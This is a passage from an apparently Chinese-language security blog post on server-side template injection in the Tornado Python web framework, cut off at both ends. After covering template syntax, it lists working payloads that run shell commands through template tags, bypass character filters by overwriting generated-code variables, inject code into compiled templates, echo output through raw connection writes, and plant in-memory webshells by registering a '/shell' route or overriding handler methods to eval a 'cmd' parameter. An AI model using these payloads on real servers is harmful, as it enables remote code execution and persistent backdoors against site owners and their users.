class="hljs-number">8888</span>)<br>tornado.ioloop.IOLoop.current().start()<br></code></pre></td></tr></table></figure></p><p>非常简洁。</p><p>上面这个例子需要注意的有这几点：</p><ul><li>继承 <code>tornado.web.RequestHandler</code> 之后就可以定制不同请求方式要执行的函数。如果某个请求方式没有对应的函数，则会返回 405，也就是 <code>Method Not Allowed</code></li><li>路径对应的 endpoint 不需要 <code>return</code>，直接用 <code>self.write</code>、<code>self.render_string</code>、<code>self.render</code> 等等就可以返回响应内容</li><li>获取参数用 <code>self.get_argument</code>，如果不指定默认值，那么客户端没传参的时候会返回 400，也就是 <code>Bad Request</code></li></ul><h3 id="模板语法">模板语法</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> tornado.template <span class="hljs-keyword">as</span> template<br><br>payload = <span class="hljs-string">&quot;&#123;&#123;1+1&#125;&#125;&quot;</span><br><span class="hljs-built_in">print</span>(template.Template(payload).generate())<br></code></pre></td></tr></table></figure><p>这就是最简单的一个实验脚本了。当然也可以通过 <code>template.Loader</code> 加载本地的模板文件；以及可以在 <code>generate</code> 中指定任意参数，从而可以在模板字符串中接受它。这些与 jinja2 都非常类似。</p><ol type="1"><li><code>&#123;&#123; ... &#125;&#125;</code>：里面直接写 python 语句即可，没有经过特殊的转换。默认输出会经过 html 编码</li><li><code>&#123;% ... %&#125;</code>：内置的特殊语法，有以下几种规则<ol type="1"><li><code>&#123;# ... #&#125;</code>：注释</li><li><code>&#123;% apply *function* %&#125;...&#123;% end %&#125;</code>：用于执行函数，<code>function</code> 是函数名。<code>apply</code> 到 <code>end</code> 之间的内容是函数的参数</li><li><code>&#123;% autoescape *function* %&#125;</code>：用于设置当前模板文件的编码方式。</li><li><code>&#123;% block *name* %&#125;...&#123;% end %&#125;</code>：引用定义过的模板段，通常来说会配合 <code>extends</code> 使用。感觉 <code>block</code> 同时承担了定义和引用的作用，这个行为不太好理解，比较奇怪。比如 <code>&#123;% block name %&#125;a&#123;% end %&#125;&#123;% block name %&#125;b&#123;% end %&#125;</code> 的结果是 <code>bb</code>...</li><li><code>&#123;% comment ... %&#125;</code>：也是注释</li><li><code>&#123;% extends *filename* %&#125;</code>：将模板文件引入当前的模板，配合 <code>block</code> 食用。使用 <code>extends</code> 的模板是比较特殊的，需要有 template loader，以及如果要起到继承的作用，需要先在加载被引用的模板文件，然后再加载引用的模板文件</li><li><code>&#123;% for *var* in *expr* %&#125;...&#123;% end %&#125;</code>：等价与 python 的 for 循环，可以使用 <code>&#123;% break %&#125;</code> 和 <code>&#123;% continue %&#125;</code></li><li><code>&#123;% from *x* import *y* %&#125;</code>：等价与 python 原始的 <code>import</code></li><li><code>&#123;% if *condition* %&#125;...&#123;% elif *condition* %&#125;...&#123;% else %&#125;...&#123;% end %&#125;</code>：等价与 python 的 <code>if</code></li><li><code>&#123;% import *module* %&#125;</code>：等价与 python 原始的 <code>import</code></li><li><code>&#123;% include *filename* %&#125;</code>：与手动合并模板文件到 <code>include</code> 位置的效果一样（<code>autoescape</code> 是唯一不生效的例外）</li><li><code>&#123;% module *expr* %&#125;</code>：模块化模板引用，通常用于 UI 模块。这里有个例子挺好的，可以参考下如何使用：https://wizardforcel.gitbooks.io/tornado-overview/content/17.html</li><li><code>&#123;% module Template("foo.html", arg=42) %&#125;</code>：</li><li><code>&#123;% raw *expr* %&#125;</code>：就是常规的模板语句，只是输出不会被转义</li><li><code>&#123;% set *x* = *y* %&#125;</code>：创建一个局部变量</li><li><code>&#123;% try %&#125;...&#123;% except %&#125;...&#123;% else %&#125;...&#123;% finally %&#125;...&#123;% end %&#125;</code>：等同于 python 的异常捕获相关语句</li><li><code>&#123;% while *condition* %&#125;... &#123;% end %&#125;</code>：等价与 python 的 while 循环，可以使用 <code>&#123;% break %&#125;</code> 和 <code>&#123;% continue %&#125;</code></li><li><code>&#123;% whitespace *mode* %&#125;</code>：设定模板对于空白符号的处理机制，有三种：<code>all</code> - 不做修改、<code>single</code> - 多个空白符号变成一个、<code>oneline</code> - 先把所有空白符变成空格，然后连续空格变成一个空格</li></ol></li><li><code>apply</code> 的内置函数列表：<ol type="1"><li><code>linkify</code>：把链接转为 html 链接标签（<code>&lt;a href="...</code>）</li><li><code>squeeze</code>：作用与 <code>&#123;% whitespace oneline %&#125;</code> 一样</li></ol></li><li><code>autoescape</code> 的内置函数列表：<ol type="1"><li><code>xhtml_escape</code>：html 编码</li><li><code>json_encode</code>：转为 json</li><li><code>url_escape</code>：url 编码</li></ol></li><li>其他函数（需要在 settings 中指定）<ol type="1"><li><code>xhtml_unescape</code>：html 解码</li><li><code>url_unescape</code>：url 解码</li><li><code>json_decode</code>：解开 json</li><li><code>utf8</code>：utf8 编码</li><li><code>to_unicode</code>：utf8 解码</li><li><code>native_str</code>：utf8 解码</li><li><code>to_basestring</code>：历史遗留功能，现在和 <code>to_unicode</code> 是一样的作用</li><li><code>recursive_unicode</code>：把可迭代对象中的所有元素进行 <code>to_unicode</code></li></ol></li></ol><p>由于通常模板实现时还会引入一些特殊的全局变量或者函数，通过 <code>locals()</code> 与 <code>globals()</code>（或者看代码）可以挖掘一些没有在文档中说明的隐藏函数：</p><ul><li><code>escape</code>：就是 <code>xhtml_escape</code></li><li><code>datetime</code>：就是 python 标准库里的 datetime</li><li><code>_tt_utf8</code>：就是 <code>utf8</code></li></ul><p>还有一个比较有趣的隐藏变量：<code>__loader__</code>，这个东西下面有个 <code>get_source</code>，它的作用是获取当前模板翻译后的代码，后面会用到。</p><p>至此，我们可以发现 Tornado 的模板是非常灵活的，几乎不设限。相较 Flask 设置的“沙箱”，对于研发来说 Tornado 要方便很多，但同时也方便了攻击者。</p><p>好了，到这里，我相信你和我一样，已经精通 Tornado 了。</p><h2 id="攻击思路">攻击思路</h2><p>Tornado 你可以理解为是 Flask + jinja2，所以 Tornado 的模板 <code>tornado.template</code> 其实也可以用在 Flask 里。为了能够讲清楚 Tornado 的 SSTI，我打算先写 <code>tornado.template</code> 再写 <code>tornado.template</code> + <code>tornado.web.Application</code>，这样有个逐步递进的过程，更加容易理解。</p><h3 id="ssti-in-tornado.template">SSTI in tornado.template</h3><h4 id="常规手法">常规手法</h4><p>由于 Tornado 模板实在过于开放，和 mako 差不多。所以 SSTI 手法基本上兼容 jinja2、mako 的 SSTI 手法，思路非常灵活。</p><p>我感觉绕过限制的话，直接用 Python 沙箱逃逸的思路即可，甚至连那里面的 Unicode 规范化的 bypass 姿势也可以直接用。所以我觉得在常规手法上，这里没有太多需要补充的点。</p><p>这里列举一下可以直接执行代码的方式吧：</p><ol type="1"><li><code>&#123;&#123; __import__("os").system("whoami") &#125;&#125;</code></li><li><code>&#123;% apply __import__("os").system %&#125;id&#123;% end %&#125;</code></li><li><code>&#123;% raw __import__("os").system("whoami") %&#125;</code></li></ol><p>下面说一些稍微高级点的技巧。</p><h4 id="临时代码的变量覆盖">临时代码的变量覆盖</h4><p>Tornado 在生成模板的时候会生成一份 python 代码，这份代码就是模板翻译后的临时代码（不知道有没有更好的称呼。。）</p><p>所以先来浅析一下 Tornado 模板相关的源码。</p><p>整个分析过程我就不啰嗦了，总结一下：在 <code>site-packages/tornado/template.py</code> 的 <code>class Template</code> 下，<code>__init__</code> 负责读取模板，然后调用 <code>_generate_python</code> 将模板内容转为 Python 代码，转换过程会用到 <code>_CodeWriter</code>，它负责把生成的 Python 代码写入 <code>String.IO</code> 实例中。拿到临时代码之后，将生成的 Python 代码编译为字节码。在执行 <code>generate</code> 的时候，会将临时代码用 <code>exec</code> 执行。</p><p>那么如果能看到临时代码的话，分析起来就比较方便了。这有很多种办法。</p><p>例如利用上面提到过的 <code>__loader__.get_source</code>。先看下一份临时代码长啥样：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-tornado/ab0763a5-1948-417b-8bfd-d6b3b5e331d5.png!blog" /></p><p>先尝试一下简单的覆盖：<code>Template('&#123;&#123;print(__loader__.get_source(1))&#125;&#125;&#123;% set _tt_utf8 = __import__("os").system %&#125;&#123;&#123;"id"&#125;&#125;').generate()</code></p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-tornado/80d55c9b-3907-4ee7-8982-5562579f6e17.png!blog" /></p><p>可以看到，由于 set 了 <code>_tt_utf8</code>，<code>_tt_utf8</code> 会被 Python 解释器视为局部变量，所以临时代码在执行到打印源码那一段的时候就抛出了错误（下面会具体解释原因）。所以只需要去掉前面打印源码的模板代码，就可以执行命令了：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-tornado/3d22e7dd-6fdc-4bb4-a8a6-dcb43aa9f2a0.png!blog" /></p><p>所以这时需要看代码的话，在 <code>Template.__init__</code> 中打印就可以了：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-tornado/80e7c628-faf5-47e9-afb0-1edf3c147190.png!blog#width-zoom7" /></p><p>那么这里还遗留了最后一个问题：为什么 set <code>_tt_utf8</code> 之后，原先命名空间里的 <code>_tt_utf8</code> 就失效了？答案在 <code>Template.__init__</code> 调用的 <code>exec_in</code> 里，这个函数位于 <code>site-packages/tornado/util.py</code> 中，其实就是一个指定了 globals 的 <code>exec</code>。所以这种场景可以抽象为：<br /><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs py">namespace = &#123;&#125;<br><br>source_code = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">def test():</span><br><span class="hljs-string">    print(str(1))</span><br><span class="hljs-string">    str = id</span><br><span class="hljs-string">    print(str)</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-built_in">exec</span>(<br>    <span class="hljs-built_in">compile</span>(<br>        source_code,<br>        <span class="hljs-string">&quot;&lt;string&gt;&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>,<br>    ),<br>    namespace,<br>    <span class="hljs-literal">None</span><br>)<br>namespace[<span class="hljs-string">&quot;test&quot;</span>]()<br><span class="hljs-comment"># 源码中用到了 typing.cast，</span><br><span class="hljs-comment"># 这个不用管，它通常用于声明动态生成的变量的类型，</span><br><span class="hljs-comment"># 是留给类型检查工具使用的。</span><br></code></pre></td></tr></table></figure></p><p>其实还可以进一步抽象为：<br /><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">def</span> <span class="hljs-title function_">test</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>    <span class="hljs-built_in">str</span> = <span class="hljs-built_in">id</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br><br>test()<br></code></pre></td></tr></table></figure></p><p>这段代码执行会报 <code>UnboundLocalError: local variable 'str' referenced before assignment</code>。</p><p>Python 官方对此给出的回答是：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-tornado/e92f98b7-798c-43e2-b716-c1710974d15d.png!blog" /></p><p>在函数体中任意位置对变量重新赋值，这个变量在执行的时候就会被统一认定为是局部变量，所以 <code>str</code> 就是 <code>referenced before assignment</code> 了。</p><p>所以我们在用 <code>&#123;% set %&#125;</code> 来玩变量覆盖的时候要特别小心这个陷阱。</p><p>掌握如何覆盖变量之后，我们就可以探索一些更加有趣的技巧了。例如不用 <code>(</code>、<code>)</code> 来完成命令执行：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">Template(<span class="hljs-string">&#x27;&#x27;&#x27;&#123;% set _tt_utf8 = str %&#125;&#123;% set xhtml_escape = eval %&#125;&#123;&#123;&#x27;__import__\\x28&quot;os&quot;\\x29.system\\x28&quot;id&quot;\\x29&#x27;&#125;&#125;&#x27;&#x27;&#x27;</span>).generate()<br></code></pre></td></tr></table></figure><h4 id="临时代码注入">临时代码注入</h4><p>再拓展一下思路，既然可以覆盖变量，那么能不能在临时代码中插入任意代码呢？显然注入任意代码要比覆盖变量实用得多。</p><p>来看上文中提到一个 payload：<code>&#123;% apply __import__("os").system %&#125;id&#123;% end %&#125;</code>，它虽然可以成功执行，但其实是会报错的，不够完美：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-tornado/fa6c3caf-6fb3-4ca2-b71b-94512b575b03.png!blog#width-zoom7" /></p><p>因为 <code>os.system</code> 的返回值是 int 类型，而 <code>_tt_utf8</code> 不能接受 int 类型的参数。</p><p>先来看下临时代码：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-tornado/400fc560-bd4b-491e-8526-b4b462448e25.png!blog#width-zoom7" /></p><p>可以看到，我们在 apply 后传入的 <code>__import__("os").system</code> 被原封不动地放到了 <code>_tt_append(_tt_utf8(...))</code> 里面去了，所以这里其实支持任意 python 语句，甚至不一定需要是一个函数。所以 apply 的利用方式还可以变形为：</p><ol type="1"><li><code>&#123;% apply __import__("os").system("id") %&#125;id&#123;% end %&#125;</code>：虽然会报错但已执行命令</li><li><code>&#123;% apply [__import__("os").system("id"), str][1] %&#125;id&#123;% end %&#125;</code>：能执行命令且不会报错</li></ol><p>看源码可知，临时代码的生成是直接往文件里写入，所以下面这种离谱的 payload 自然也是可以利用的：<br /><code>Template('''&#123;% set _tt_utf8 = str %&#125;&#123;% set xhtml_escape = str\n    eval("__import__('os').system('id')") %&#125;''').generate()</code></p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-tornado/9b165f37-03f6-43ac-be95-3189c2e39976.png!blog" /></p><p>最后我们如果仔细观察这份临时代码可以发现，使用 <code>&#123;% apply &#125;` 会创建一个新的函数叫 `_tt_apply0`，但真正的 exp 其实是在函数外面，这就说明诸如 `&#123;% function &#125;` 形式的模板很多是可以利用的，比如 `&#123;% autoescape __import__("os").system %&#125;&#123;&#123;"id"&#125;&#125;</code>。甚至像 <code>&#123;% set &#125;` 这种看起来只能用来创建变量的语法，同样有代码注入问题：![](https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-tornado/d7749110-5db6-4348-9f43-1b5502fbff61.png!blog#width-zoom7)由于本文最后会有所有已知利用方式的总结，为避免重复这里就不放了。#### 模板文件包含我们可以通过 `&#123;%extends ... %&#125;</code>、<code>&#123;%include ... %&#125;</code> 来包含模板文件，从而执行任意 ssti 的 payload。前提是需要有可控文件，比如一个文件上传点，至于被包含的模板文件的后缀是无所谓的。</p><p>测试用例：<br /><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> tornado.template<br><br>payload = <span class="hljs-string">&quot;&quot;</span><br>loader = tornado.template.Loader(<span class="hljs-string">&quot;.&quot;</span>)<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;base.html&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>).write(payload)<br>loader.load(<span class="hljs-string">&quot;base.html&quot;</span>).generate()<br></code></pre></td></tr></table></figure></p><p>只要 <code>any.any</code> 这个文件可控（比如文件内容是 <code>&#123;&#123;__import__("os").system("id")&#125;&#125;</code>），那么 payload 为 <code>&#123;% extends any.any%&#125;</code>，这样也可以实现 SSTI。</p><h3 id="ssti-in-tornado.web.application">SSTI in tornado.web.Application</h3><p>先来写个测试用例：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> tornado.ioloop<br><span class="hljs-keyword">import</span> tornado.web<br><span class="hljs-keyword">from</span> tornado.template <span class="hljs-keyword">import</span> Template<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">IndexHandler</span>(tornado.web.RequestHandler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">self</span>):<br>        tornado.web.RequestHandler._template_loaders = &#123;&#125;<br><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;index.html&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> (f):<br>            f.write(self.get_argument(<span class="hljs-string">&#x27;name&#x27;</span>))<br><br>        self.render(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><br>app = tornado.web.Application(<br>    [(<span class="hljs-string">&#x27;/&#x27;</span>, IndexHandler)],<br>)<br>app.listen(<span class="hljs-number">8888</span>, address=<span class="hljs-string">&quot;127.0.0.1&quot;</span>)<br>tornado.ioloop.IOLoop.current().start()<br></code></pre></td></tr></table></figure><p>这里需要稍微解释一下。对于 Tornado 来说，一旦 <code>self.render</code> 之后，就会实例化一个 <code>tornado.template.Loader</code>，这个时候再去修改文件内容，它也不会再实例化一次。所以这里需要把 <code>tornado.web.RequestHandler._template_loaders</code> 清空。否则在利用的时候，会一直用的第一个传入的 payload。</p><p><del>（所以其实要写出一个渲染文件的 SSTI 还不是那么简单的）</del></p><p>这种写法会新引入变量（只列举已知有用的）：</p><ol type="1"><li><code>request</code>：即 <code>tornado.httputil.HTTPServerRequest</code>，下面的属性都是与 http 请求相关的</li><li><code>handler</code>：<code>tornado.web.RequestHandler</code> 的示例。表示当前请求的 url 是谁处理的，比如这个代码来说，handle 就是 <code>IndexHandler</code>。它下面有很多属性可以利用。</li></ol><p>所以 Tornado 中，<code>tornado.httputil.HTTPServerRequest</code> 和 <code>tornado.web.RequestHandler</code> 是非常重要的类。它们拥有非常多的属性，在 SSTI 相关的知识点中，我们需要熟练掌握这些属性的作用。</p><h4 id="利用-httpserverrequest">利用 HTTPServerRequest</h4><p>为了方便下面把 <code>tornado.httputil.HTTPServerRequest</code> 的实例称为 <code>request</code>。</p><p>注意，由于属性非常多，属性自己也还有属性。所以这部分我只列了一些我感觉会用到的属性，肯定不全，有特殊需求的话需要自行进行挖掘。</p><h5 id="绕过字符限制">绕过字符限制</h5><ul><li><code>request.query</code>：包含 get 参数</li><li><code>request.query_arguments</code>：解析成字典的 get 参数，可用于传递基础类型的值（字符串、整数等）</li><li><code>request.arguments</code>：包含 get、post 参数</li><li><code>request.body</code>：包含 post 参数</li><li><code>request.body_arguments</code>：解析成字典的 post 参数，可用于传递基础类型的值（字符串、整数等）</li><li><code>request.cookies</code>：就是 cookie</li><li><code>request.files</code>：上传的文件</li><li><code>request.headers</code>：请求头</li><li><code>request.full_url</code>：完整的 url</li><li><code>request.uri</code>：包含 get 参数的 url。有趣的是，直接 <code>str(requests)</code> 然后切片，也可以获得包含 get 参数的 url。这样的话不需要 <code>.</code> 或者 <code>getattr</code> 之类的函数了。</li><li><code>request.host</code>：Host 头</li><li><code>request.host_name</code>：Host 头</li><li>...</li></ul><h5 id="回显结果">回显结果</h5><ul><li><code>request.connection.write</code></li><li><code>request.connection.stream.write</code></li><li><code>request.server_connection.stream.write</code></li></ul><p>例如：<br /><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;%raw request.connection.write((<span class="hljs-string">&quot;HTTP/1.1 200 OK\r\nCMD: &quot;</span>+<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;os&quot;</span>).popen(<span class="hljs-string">&quot;id&quot;</span>).read()).encode()+<span class="hljs-string">b&quot;hacked: &quot;</span>)%&#125;<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-tornado/ec28df70-f52d-4f64-aab8-e4eb6e491192.png!blog" /></p><h4 id="利用-application">利用 Application</h4><p>主要用于攻击的有这几个属性：</p><ul><li><code>Application.settings</code>：web 服务的配置，可能会泄露一些敏感的配置</li><li><code>Application.add_handlers</code>：新增一个服务处理逻辑，可用于制作内存马，后面会一起说</li><li><code>Application.wildcard_router.add_rules</code>：新增一个 url 处理逻辑，可用于制作内存马</li><li><code>Application.add_transform</code>：新增一个返回数据的处理逻辑，理论上可以配合响应头来搞个内存马</li></ul><h4 id="利用-requesthandler">利用 RequestHandler</h4><p>为了方便下面把 <code>tornado.web.RequestHandler</code> 称为 <code>handler</code>。</p><p>同样，由于 handler 的属性也非常多，所以这部分也只是列举一些我觉得有用的属性。</p><p>需要注意的是，handler 是有 <code>request</code> 属性的，所以理论上 handler 要比 request 实用。</p><h5 id="绕过字符限制-1">绕过字符限制</h5><ol type="1"><li><code>RequestHandler.request.*</code>：参考利用 <code>HTTPServerRequest</code> 那节</li><li>其他和 request 一样的方法：例如 <code>get_argument</code> 等等，就不一一列举了，可以参考官方文档</li></ol><h5 id="回显结果-1">回显结果</h5><p>随便列一点吧：</p><ul><li><code>RequestHandler.set_cookie</code>：设置 cookie</li><li><code>RequestHandler.set_header</code>：设置一个新的响应头</li><li><code>RequestHandler.redirect</code>：重定向，可以通过 location 获取回显</li><li><code>RequestHandler.send_error</code>：发送错误码和错误信息</li><li><code>RequestHandler.write_error</code>：同上，被 <code>send_error</code> 调用</li><li>...</li></ul><h5 id="内存马">内存马</h5><p>Web 服务的内存马的构造一般是两个思路：</p><ol type="1"><li>注册一个新的 url，绑定恶意的函数</li><li>修改原有的 url 处理逻辑</li></ol><p>与此相关的 Tornado 属性：</p><ol type="1"><li><code>RequestHandler.application</code>：即 <code>tornado.web.Application</code> 的实例。拿到这个就可以控制绝大多数 web 服务的行为。</li><li><code>RequestHandler.initialize()</code>：在实例化 <code>RequestHandler</code> 的时候执行的函数（类似 <code>__init__</code>）</li><li><code>RequestHandler.prepare()</code>：在准备处理请求时执行的函数</li><li><code>RequestHandler.on_finish()</code>：请求处理时完毕时执行的函数（只能做无回显的 RCE 后门，因为执行这个方法的时候，连接已经关闭了）</li><li>在原有路径上新增一个方法专门用于执行恶意指令：<ol type="1"><li><code>RequestHandler.get(*args: str, **kwargs: str)</code></li><li><code>RequestHandler.head(*args: str, **kwargs: str)</code></li><li><code>RequestHandler.post(*args: str, **kwargs: str)</code></li><li><code>RequestHandler.delete(*args: str, **kwargs: str)</code></li><li><code>RequestHandler.patch(*args: str, **kwargs: str)</code></li><li><code>RequestHandler.put(*args: str, **kwargs: str)</code></li><li><code>RequestHandler.options(*args: str, **kwargs: str)</code></li></ol></li><li>其他可被覆盖且处理请求是会被调用的函数</li><li><code>RequestHandler.application.add_handlers</code></li><li><code>RequestHandler.application.wildcard_router.add_rules</code></li></ol><blockquote><p>通过注册新的函数构造后门</p></blockquote><p>那么首先很明显，通过 <code>handler.application.add_handlers</code> 即可注册一个新的 url，对应上面提到的第一种内存马构造手段：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;%raw handler.application.add_handlers(<span class="hljs-string">&quot;.*&quot;</span>,[(<span class="hljs-string">&quot;/shell&quot;</span>,<span class="hljs-built_in">type</span>(<span class="hljs-string">&quot;x&quot;</span>,(<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;tornado&quot;</span>).web.RequestHandler,),&#123;<span class="hljs-string">&quot;get&quot;</span>:<span class="hljs-keyword">lambda</span> x: x.write(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">eval</span>(x.get_argument(<span class="hljs-string">&quot;name&quot;</span>))))&#125;))])%&#125;<br></code></pre></td></tr></table></figure><p>稍微解释一下 payload，这里我们是用简单的方式来调用 <code>add_handlers</code>：</p><ol type="1"><li>参数第一个是 <code>host</code>，支持正则，但是有时候我们不一定知道服务监听的地址（比如容器那种），所以最好还是用 <code>.*</code></li><li>第二个参数是一个可迭代对象，里面又是一个个可迭代对象。然后最里层的第一个元素是 url，第二个元素是 <code>RequestHandler</code> 实例，这里用 <code>type</code> 来实现实例化（其实就是一开始的那个 web 示例里的 <code>class IndexHandler</code>）</li></ol><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-tornado/cb2456f9-2b08-4c60-b92e-2e2ddb1a3de4.png!blog" /></p><p>需要注意的是，<code>add_handlers</code> 是直接在原有的 handler 列表中 <code>append</code>，并且先到先得，所以一旦添加了一个有问题的后门，就只能换一个新的路径了。</p><p>理论上 <code>handler.application.wildcard_router.add_rules</code> 也可以构造内存马，反正方法一样，我就不费劲去写了。</p><blockquote><p>通过覆盖处理函数构造后门</p></blockquote><p>接下来看第二种构造手段。对于 Tornado 来说，每次请求都是一个全新的 handler 和 request，所以这种直接给 handler 绑定恶意函数的利用方式是不行的：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;%raw handler.prepare = <span class="hljs-keyword">lambda</span> x: handler.write(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">eval</span>(handler.get_query_argument(<span class="hljs-string">&quot;cmd&quot;</span>, <span class="hljs-string">&quot;id&quot;</span>))))%&#125;<br></code></pre></td></tr></table></figure><p>这里稍微解释一下，Tornado 对于参数有严格的限制，例如对于这个示例来说，<code>name</code> 参数一定要有。参数可以多但不能少，为了避免影响原有的功能，就通过 name 参数来传恶意指令了，通常我会自定义一个新的参数用于接收。</p><p>既然实例修改不起作用，我们可以用 <code>__class__</code> 顺藤摸瓜去修改它的类，这样修改完之后，所有新创建的实例都会自带恶意函数，在源头投毒：<br /><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;%raw handler.__class__.prepare = <span class="hljs-keyword">lambda</span> x: handler.write(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">eval</span>(handler.get_query_argument(<span class="hljs-string">&quot;cmd&quot;</span>, <span class="hljs-string">&quot;id&quot;</span>))))%&#125;<br></code></pre></td></tr></table></figure></p><p>当然，这个 payload 还有两个问题：</p><ol type="1"><li>handler 在请求结束之后自动销毁。即使保存下来，绑定恶意函数之后，payload 里的 <code>handler.write</code> 也会异常：<code>RuntimeError: Cannot write() after finish()</code>，因为对于这个 handler 来说连接已经关闭了。</li><li><code>handler.get_query_argument</code> 获取的永远是绑定恶意函数时传入的参数，这样及时注册恶意函数成功，后续也没办法修改传入的参数了</li></ol><p>handler 既然是 <code>tornado.web.RequestHandler</code> 的实例化，那么 <code>handler.write</code> 的第一个参数必然是类中的 <code>self</code>，所以要想动态地获取当前的实例，就应该用 <code>lambda</code> 接收到的参数。答案显而易见：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;%raw handler.prepare = <span class="hljs-keyword">lambda</span> x: x.write(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">eval</span>(x.get_query_argument(<span class="hljs-string">&quot;cmd&quot;</span>, <span class="hljs-string">&quot;id&quot;</span>))))%&#125;<br></code></pre></td></tr></table></figure><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-tornado/682b0773-7a85-4d8a-9657-a63b6b02501f.png!blog" /></p><p>最后还需要注意一个关键的地方，<code>handler.prepare</code> 的返回值要么是 <code>Awaitable</code> 的，要么是 <code>None</code>。所以作为既能用于回显，又返回 <code>None</code> 的 <code>handler.write</code> 简直是我们旅游出门居家必备的不二之选。</p><p><strong>友情提示，通过覆盖请求处理前的方法来添加后门。一旦失败，整个 web 服务就会异常，必须重启才能恢复。</strong></p><p>当然啦，进一步扩展覆盖 <code>RequestHandler</code> 方法的思路，这个类下很多方法都可以用来只做一个后门。<strong>由于姿势实在是太多了，我这里就举两种例子，若有需要橘友们根据调用关系自己分析构造即可。</strong></p><blockquote><p>异常情况下的内存马回显</p></blockquote><p>既然提到了异常，上面说的都是在返回 200 状态码下的数据回显，若原本的功能因为参数异常出了问题，<code>handler.write</code> 是不会生效的，直接返回 <code>500</code>。例如我们种植好后门之后，随便获取个不存在的属性就会直接 <code>500</code>：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-SSTI-tornado/d6103a67-8dae-4127-89bc-007236a4dedc.png!blog" /></p><p>这一点我们可以在 <code>RequestHandler._execute</code> 中找到答案，整个请求处理流程一旦出错就会走到 <code>RequestHandler._handle_request_exception</code>（这里面传输数据用的是 <code>RequestHandler.send_error</code>）。而调用 <code>RequestHandler.write</code> 不过是把数据写入 <code>_write_buffer</code> 罢了，真正返回数据给客户端的方法是 <code>RequestHandler.flush</code>，它调用的是 